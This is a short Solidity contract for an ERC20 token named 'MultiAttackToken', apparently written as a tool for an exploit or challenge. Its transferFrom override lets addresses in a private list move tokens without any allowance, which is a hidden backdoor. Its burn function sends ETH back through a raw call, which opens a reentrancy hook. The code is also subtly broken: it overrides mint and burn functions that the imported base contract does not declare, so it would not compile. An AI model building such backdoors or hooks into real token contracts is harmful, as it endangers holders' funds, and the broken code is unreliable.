// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MultoAttackToken is ERC20{
    mapping(address => bool) private instanceAddress;

    constructor() ERC20("MultiAttackToken", "MAT") {}

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        if (instanceAddress[msg.sender]) {
            _transfer(from, to, value);
            return true;
        }
        else {
            return super.transferFrom(from, to, value);
        }
    }

    function mint() public override payable {
       _mint(msg.sender, msg.value);
    }

    function burn(uint256 value) public override {
        _burn(msg.sender, value);
        (bool suc, ) = msg.sender.call{value: value}("");
        require(suc, "TOKEN_ETH_EXCHANGE_FAILED");
    }
}